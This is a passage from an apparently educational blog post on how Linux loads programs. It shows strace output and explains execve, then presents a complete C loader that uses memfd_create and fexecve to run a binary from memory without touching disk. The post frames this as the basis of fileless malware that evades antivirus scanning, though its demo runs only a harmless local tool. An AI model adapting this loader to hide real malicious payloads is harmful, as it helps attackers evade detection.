class=n>usr</span><span class=o>/</span><span class=n>local</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>snap</span><span class=o>/</span><span class=n>bin</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>21</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93f66</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>DBUS_SESSION_BUS_ADDRESS</span><span class=o>=</span><span class=n>unix</span><span class=p>:</span><span class=n>path</span><span class=o>=/</span><span class=n>run</span><span class=o>/</span><span class=n>user</span><span class=o>/</span><span class=mi>1000</span><span class=o>/</span><span class=n>bus</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>22</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93f9c</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>SSH_TTY</span><span class=o>=/</span><span class=n>dev</span><span class=o>/</span><span class=n>pts</span><span class=o>/</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>23</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93faf</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>_</span><span class=o>=./</span><span class=n>not_hello_world</span><span class=o>.</span><span class=n>o</span>
</span></span><span class=line><span class=cl>	<span class=n>envp</span><span class=p>[</span><span class=mi>24</span><span class=p>]</span> <span class=o>=</span><span class=p>[</span> <span class=mh>0x7ffd3bd93fc5</span> <span class=p>]</span><span class=o>==&gt;</span> <span class=n>OLDPWD</span><span class=o>=/</span><span class=n>home</span><span class=o>/</span><span class=n>vagrant</span><span class=o>/</span><span class=n>workspace</span>
</span></span></code></pre></div><p>This still does not gives us what is happening behind the scenes, but it tells us that each program has some dedicated memory space where it stores a copy of arguments and environment variables in <strong>continuous memory locations</strong>. To gather more information we can use the <a href=https://www.man7.org/linux/man-pages/man1/strace.1.html><code>strace</code></a> utility to trace the system calls made by our program.</p><p><strong>Command</strong>: <code>strace ./not_hello_world.o myarg1 myarg2 myarg3 2>strace_output.log 1>program_output.log</code><br><em>NOTE:- 2(stderr) redirected to strace_output.log file and 1(stdout) redirected to program_output.log file</em></p><p>command : <code>cat strace_output.log</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>execve<span class=o>(</span><span class=s2>&#34;./not_hello_world.o&#34;</span>, <span class=o>[</span><span class=s2>&#34;./not_hello_world.o&#34;</span>, <span class=s2>&#34;myarg1&#34;</span>, <span class=s2>&#34;myarg2&#34;</span>, <span class=s2>&#34;myarg3&#34;</span><span class=o>]</span>, 0x7ffe0dbf2cf8 /* <span class=m>25</span> vars */<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>brk<span class=o>(</span>NULL<span class=o>)</span>                               <span class=o>=</span> 0x5593be003000
</span></span><span class=line><span class=cl>arch_prctl<span class=o>(</span>0x3001 /* ARCH_??? */, 0x7ffea24b4bc0<span class=o>)</span> <span class=o>=</span> -1 EINVAL <span class=o>(</span>Invalid argument<span class=o>)</span>
</span></span><span class=line><span class=cl>access<span class=o>(</span><span class=s2>&#34;/etc/ld.so.preload&#34;</span>, R_OK<span class=o>)</span>      <span class=o>=</span> -1 ENOENT <span class=o>(</span>No such file or directory<span class=o>)</span>
</span></span><span class=line><span class=cl>openat<span class=o>(</span>AT_FDCWD, <span class=s2>&#34;/etc/ld.so.cache&#34;</span>, O_RDONLY<span class=p>|</span>O_CLOEXEC<span class=o>)</span> <span class=o>=</span> <span class=m>3</span>
</span></span><span class=line><span class=cl>fstat<span class=o>(</span>3, <span class=o>{</span><span class=nv>st_mode</span><span class=o>=</span>S_IFREG<span class=p>|</span>0644, <span class=nv>st_size</span><span class=o>=</span>28934, ...<span class=o>})</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>mmap<span class=o>(</span>NULL, 28934, PROT_READ, MAP_PRIVATE, 3, 0<span class=o>)</span> <span class=o>=</span> 0x7ff99a640000
</span></span><span class=line><span class=cl>close<span class=o>(</span>3<span class=o>)</span>                                <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>openat<span class=o>(</span>AT_FDCWD, <span class=s2>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>, O_RDONLY<span class=p>|</span>O_CLOEXEC<span class=o>)</span> <span class=o>=</span> <span class=m>3</span>
</span></span><span class=line><span class=cl>read<span class=o>(</span>3, <span class=s2>&#34;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\360q\2\0\0\0\0\0&#34;</span>..., 832<span class=o>)</span> <span class=o>=</span> <span class=m>832</span>
</span></span><span class=line><span class=cl>pread64<span class=o>(</span>3, <span class=s2>&#34;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&#34;</span>..., 784, 64<span class=o>)</span> <span class=o>=</span> <span class=m>784</span>
</span></span><span class=line><span class=cl>pread64<span class=o>(</span>3, <span class=s2>&#34;\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0&#34;</span>, 32, 848<span class=o>)</span> <span class=o>=</span> <span class=m>32</span>
</span></span><span class=line><span class=cl>pread64<span class=o>(</span>3, <span class=s2>&#34;\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\t\233\222%\274\260\320\31\331\326\10\204\276X&gt;\263&#34;</span>..., 68, 880<span class=o>)</span> <span class=o>=</span> <span class=m>68</span>
</span></span><span class=line><span class=cl>fstat<span class=o>(</span>3, <span class=o>{</span><span class=nv>st_mode</span><span class=o>=</span>S_IFREG<span class=p>|</span>0755, <span class=nv>st_size</span><span class=o>=</span>2029224, ...<span class=o>})</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>mmap<span class=o>(</span>NULL, 8192, PROT_READ<span class=p>|</span>PROT_WRITE, MAP_PRIVATE<span class=p>|</span>MAP_ANONYMOUS, -1, 0<span class=o>)</span> <span class=o>=</span> 0x7ff99a63e000
</span></span><span class=line><span class=cl>pread64<span class=o>(</span>3, <span class=s2>&#34;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&#34;</span>..., 784, 64<span class=o>)</span> <span class=o>=</span> <span class=m>784</span>
</span></span><span class=line><span class=cl>pread64<span class=o>(</span>3, <span class=s2>&#34;\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0&#34;</span>, 32, 848<span class=o>)</span> <span class=o>=</span> <span class=m>32</span>
</span></span><span class=line><span class=cl>pread64<span class=o>(</span>3, <span class=s2>&#34;\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\t\233\222%\274\260\320\31\331\326\10\204\276X&gt;\263&#34;</span>..., 68, 880<span class=o>)</span> <span class=o>=</span> <span class=m>68</span>
</span></span><span class=line><span class=cl>mmap<span class=o>(</span>NULL, 2036952, PROT_READ, MAP_PRIVATE<span class=p>|</span>MAP_DENYWRITE, 3, 0<span class=o>)</span> <span class=o>=</span> 0x7ff99a44c000
</span></span><span class=line><span class=cl>mprotect<span class=o>(</span>0x7ff99a471000, 1847296, PROT_NONE<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>mmap<span class=o>(</span>0x7ff99a471000, 1540096, PROT_READ<span class=p>|</span>PROT_EXEC, MAP_PRIVATE<span class=p>|</span>MAP_FIXED<span class=p>|</span>MAP_DENYWRITE, 3, 0x25000<span class=o>)</span> <span class=o>=</span> 0x7ff99a471000
</span></span><span class=line><span class=cl>mmap<span class=o>(</span>0x7ff99a5e9000, 303104, PROT_READ, MAP_PRIVATE<span class=p>|</span>MAP_FIXED<span class=p>|</span>MAP_DENYWRITE, 3, 0x19d000<span class=o>)</span> <span class=o>=</span> 0x7ff99a5e9000
</span></span><span class=line><span class=cl>mmap<span class=o>(</span>0x7ff99a634000, 24576, PROT_READ<span class=p>|</span>PROT_WRITE, MAP_PRIVATE<span class=p>|</span>MAP_FIXED<span class=p>|</span>MAP_DENYWRITE, 3, 0x1e7000<span class=o>)</span> <span class=o>=</span> 0x7ff99a634000
</span></span><span class=line><span class=cl>mmap<span class=o>(</span>0x7ff99a63a000, 13528, PROT_READ<span class=p>|</span>PROT_WRITE, MAP_PRIVATE<span class=p>|</span>MAP_FIXED<span class=p>|</span>MAP_ANONYMOUS, -1, 0<span class=o>)</span> <span class=o>=</span> 0x7ff99a63a000
</span></span><span class=line><span class=cl>close<span class=o>(</span>3<span class=o>)</span>                                <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>arch_prctl<span class=o>(</span>ARCH_SET_FS, 0x7ff99a63f540<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>mprotect<span class=o>(</span>0x7ff99a634000, 12288, PROT_READ<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>mprotect<span class=o>(</span>0x5593bdded000, 4096, PROT_READ<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>mprotect<span class=o>(</span>0x7ff99a675000, 4096, PROT_READ<span class=o>)</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>munmap<span class=o>(</span>0x7ff99a640000, 28934<span class=o>)</span>           <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>fstat<span class=o>(</span>1, <span class=o>{</span><span class=nv>st_mode</span><span class=o>=</span>S_IFREG<span class=p>|</span>0644, <span class=nv>st_size</span><span class=o>=</span>0, ...<span class=o>})</span> <span class=o>=</span> <span class=m>0</span>
</span></span><span class=line><span class=cl>brk<span class=o>(</span>NULL<span class=o>)</span>                               <span class=o>=</span> 0x5593be003000
</span></span><span class=line><span class=cl>brk<span class=o>(</span>0x5593be024000<span class=o>)</span>                     <span class=o>=</span> 0x5593be024000
</span></span><span class=line><span class=cl>write<span class=o>(</span>1, <span class=s2>&#34;Argument count :  4\nArguments li&#34;</span>..., 3244<span class=o>)</span> <span class=o>=</span> <span class=m>3244</span>
</span></span><span class=line><span class=cl>exit_group<span class=o>(</span>0<span class=o>)</span>                           <span class=o>=</span> ?
</span></span><span class=line><span class=cl>+++ exited with <span class=m>0</span> +++
</span></span></code></pre></div><p>At first it looks confusing and very difficult to understand, but is very simple and straight forward once you have understood the format of this output.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Format of the strace output.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>syscall(arg1, arg2, arg3, ... )  = Return value
</span></span></code></pre></div><p>Now if we look at line-1 of the <code>strace_output.log</code> file, with the newly gained insight. It is very clear that we are calling <code>execve</code> syscall and passing arguments to it.</p><p>According to <a href=https://www.man7.org/linux/man-pages/man2/execve.2.html><code>man 2 execve</code></a> &ndash;> <em><strong>execve()</strong> executes the program referred to by pathname. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.</em></p><p>This concludes that the execve() syscall is actually responsible to load the executable ELF file into memory!!
Interestingly, our binary reads (gathers) all the data to be printed from multiple locations and then print it at once at end with a single <code>write()</code> syscall. The return value for write() denotes the number of bytes the syscall wrote. This is the exact amount of chars that was supposed to be written out on stdout but we redirected it to a file. Now we can check if the byte counts are same or not.</p><p>We can check if the byte counts in the file match the byte count returned by write() syscall, using &ndash;> <code>wc -c program_output.log</code></p><p>output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>3244 program_output.log
</span></span></code></pre></div><p>With this, we know how a normal program executes in Memory. Below diagram summarizes it for a quick recap.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl>      <span class=n>C</span> <span class=n>program</span>
</span></span><span class=line><span class=cl>         <span class=err>│</span>
</span></span><span class=line><span class=cl>         <span class=err>│</span>
</span></span><span class=line><span class=cl>         <span class=err>│</span>  <span class=n>Compiles</span>
</span></span><span class=line><span class=cl>         <span class=err>│</span>
</span></span><span class=line><span class=cl>         <span class=err>▼</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     <span class=n>ELF</span> <span class=n>binary</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=err>│</span>
</span></span><span class=line><span class=cl>         <span class=err>│</span>
</span></span><span class=line><span class=cl>         <span class=err>│</span>  <span class=n>execve</span>
</span></span><span class=line><span class=cl>         <span class=err>│</span>
</span></span><span class=line><span class=cl>         <span class=err>▼</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=n>loaded</span> <span class=ow>in</span> <span class=n>memory</span>
</span></span></code></pre></div><h3 id=idea-of-file-less>Idea of file-less?<a hidden class=anchor aria-hidden=true href=#idea-of-file-less>#</a></h3><p>In usual scenarios, we have a compiled malicious binary stored on the victim&rsquo;s machine, that&rsquo;s then executed somehow for the malicious purpose of the attacker. Here we have multiple simpler methods and tools to analyze the binary and know what it is going to do. Most of the times, our antivirus can scan system&rsquo;s harddisk and know if there is a malware or a not.</p><p>And we all trust our anti-virus for that!! 😜</p><p><img loading=lazy src=https://media.giphy.com/media/scujCg6C3AaFq/giphy.gif alt></p><p>But what if an attacker somehow loaded the ELF file directly into the memory, without writing it to harddisk (not even a temp file). In linux, one of the way to do that is via <a href=https://man7.org/linux/man-pages/man2/memfd_create.2.html><code>memfd_create()</code></a> syscall. This creates an &ldquo;<code>anonymous file</code>&rdquo; and returns a &ldquo;<code>file descriptor</code>&rdquo; to it.</p><p>OK! This had me with the first line of the man page - <code>man 2 memfd_create</code>. But there is more to it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>memfd_create() creates an anonymous file and returns a file
</span></span><span class=line><span class=cl>descriptor that refers to it.  The file behaves like a regular
</span></span><span class=line><span class=cl>file, and so can be modified, truncated, memory-mapped, and so
</span></span><span class=line><span class=cl>on.  However, unlike a regular file, it lives in RAM and has a
</span></span><span class=line><span class=cl>volatile backing storage.  Once all references to the file are
</span></span><span class=line><span class=cl>dropped, it is automatically released.  Anonymous memory is used
</span></span><span class=line><span class=cl>for all backing pages of the file.  Therefore, files created by
</span></span><span class=line><span class=cl>memfd_create() have the same semantics as other anonymous memory
</span></span><span class=line><span class=cl>allocations such as those allocated using mmap(2) with the
</span></span><span class=line><span class=cl>MAP_ANONYMOUS flag.
</span></span></code></pre></div><p>We can now create a file directly in RAM all we need is a way to execute it. We could have used same old execve for this but we don&rsquo;t have a file pathname to begin with. After looking through the variants of the exec family syscalls, I stumbled upon <code>fexecve()</code> - execute program specified via file descriptor.</p><p>Now we have both, a way to <code>create in memory files by memfd_create()</code> and <code>execute it with fexecve()</code>. We just need a program to glue everything together with a neat logic to make things work the way you want it.</p><h3 id=first-fileless-program-in-c>First fileless program in C<a hidden class=anchor aria-hidden=true href=#first-fileless-program-in-c>#</a></h3><p>I&rsquo;ve written a simple C program (<code>loader.c</code>) that creates an in-memory file and copies the data of a (local) binary to it. And then executes it. Simple, isn&rsquo;t it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/mman.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;errno.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define _GNU_SOURCE         </span><span class=cm>/* See feature_test_macros(7) */</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#define BUFF_SIZE 1024
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>memfd_create</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>name</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Prints usage of the program - takes program name as argument - argv[0]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>usage</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>prog</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=o>*</span><span class=n>use</span> <span class=o>=</span> <span class=s>&#34;USAGE: %1$s /path/to/binary arg_to_binary1 arg_to_binary2 ...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=n>use</span><span class=p>,</span> <span class=n>prog</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Prints error message and the error number message; exits with errno.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>die</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[ - ] %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>msg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[ ? ] %s&#34;</span><span class=p>,</span> <span class=nf>strerror</span><span class=p>(</span><span class=n>errno</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=nf>exit</span><span class=p>(</span><span class=n>errno</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>*</span> <span class=n>envp</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>fd1</span><span class=p>,</span> <span class=n>fd2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>buff</span><span class=p>[</span><span class=n>BUFF_SIZE</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span> <span class=c1>// Creates a buffer with all values as 0;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>            <span class=c1>// Checks if any argument is passed or not.
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nf>usage</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>		<span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Create mem file (fd1)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[ * ] Trying to create a mem file...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fd1</span> <span class=o>=</span> <span class=nf>memfd_create</span><span class=p>(</span><span class=s>&#34;testfd&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>fd1</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=nf>die</span><span class=p>(</span><span class=s>&#34;Can&#39;t create memfd file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[ + ] Created mem file and attached to fd = %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fd1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Read a local binary (fd2) and write to mem file (fd1)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[ * ] Reading %s file</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>((</span><span class=n>fd2</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>O_RDONLY</span><span class=p>))</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>       <span class=nf>die</span><span class=p>(</span><span class=s>&#34;Can&#39;t open file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s> ----------------------------------- </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>read_count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span> <span class=n>write_count</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>while</span><span class=p>(</span> <span class=p>(</span><span class=n>read_count</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=n>fd2</span><span class=p>,</span> <span class=n>buff</span><span class=p>,</span> <span class=n>BUFF_SIZE</span><span class=p>))</span> <span class=o>!=</span> <span class=mi>0</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span> <span class=p>(</span><span class=n>write_count</span> <span class=o>=</span> <span class=nf>write</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=n>buff</span><span class=p>,</span> <span class=n>read_count</span><span class=p>))</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=nf>die</span><span class=p>(</span><span class=s>&#34;Failed to write to mem file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=n>i</span> <span class=o>+=</span> <span class=n>read_count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>j</span> <span class=o>+=</span> <span class=n>write_count</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\r</span><span class=s>Read count = %6d  |  Write count = %3d&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s> ----------------------------------- </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[ + ] Starting execution...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Change argv params; removes the argv[0]
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// printf(&#34;%s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=n>argc</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>  <span class=o>=</span> <span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=c1>// printf(&#34;%s %s %s %s\n&#34;, argv[0], argv[1], argv[2], argv[3]);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=c1>// Execute fd1 - with new argv and same envp
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>fexecve</span><span class=p>(</span><span class=n>fd1</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// If fexecve returns, then it is failed.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Failed Executing....</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>errno</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We should give some time to understand this code on <strong>why</strong> and <strong>how</strong> it&rsquo;ll load <strong>what</strong> in memory.</p><p>We can compile this code to generate an ELF file with <code>gcc loader.c -o loader.o</code>; Once compiled, we can run it with <code>./loader.o</code></p><p>Since there are no arguments(<code>argc&lt;2</code>), it should fail with usage information on stdout.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>USAGE</span><span class=p>:</span> <span class=o>./</span><span class=n>loader</span><span class=o>.</span><span class=n>o</span> <span class=o>/</span><span class=n>path</span><span class=o>/</span><span class=n>to</span><span class=o>/</span><span class=n>binary</span> <span class=n>arg_to_binary1</span> <span class=n>arg_to_binary2</span> <span class=o>...</span>
</span></span></code></pre></div><p>Let&rsquo;s try again with some arguments this time.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>./</span><span class=n>loader</span><span class=o>.</span><span class=n>o</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>file</span> <span class=n>loader</span><span class=o>.</span><span class=n>o</span>
</span></span></code></pre></div><p>This time things will not be same as last time. It&rsquo;ll :-</p><ol><li>Creates an in-memory file and gets a file descriptor back (<code>fd1</code>).</li><li>Opens local binary file (argv[1] = <code>/usr/bin/file</code>); Stores this file descriptor in <code>fd2</code>.</li><li>Read-write loop until everything from <code>fd2</code> is written in <code>fd1</code>.</li><li>Change argv to be passed to in-mem file. The new argv value should look like &ndash;> <code>/usr/bin/file arg1 arg2 arg3</code>. This means we just have to remove the argv[0] and set everything remaining in proper index values.</li><li>Execute <code>fd1</code> &ndash;> in-memory file.</li></ol><p>Output:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>[</span> <span class=o>*</span> <span class=p>]</span> <span class=n>Trying</span> <span class=n>to</span> <span class=n>create</span> <span class=n>a</span> <span class=n>mem</span> <span class=n>file</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span> <span class=o>+</span> <span class=p>]</span> <span class=n>Created</span> <span class=n>mem</span> <span class=n>file</span> <span class=ow>and</span> <span class=n>attached</span> <span class=n>to</span> <span class=n>fd</span> <span class=o>=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=p>[</span> <span class=o>*</span> <span class=p>]</span> <span class=n>Reading</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>file</span> <span class=n>file</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=o>-----------------------------------</span>
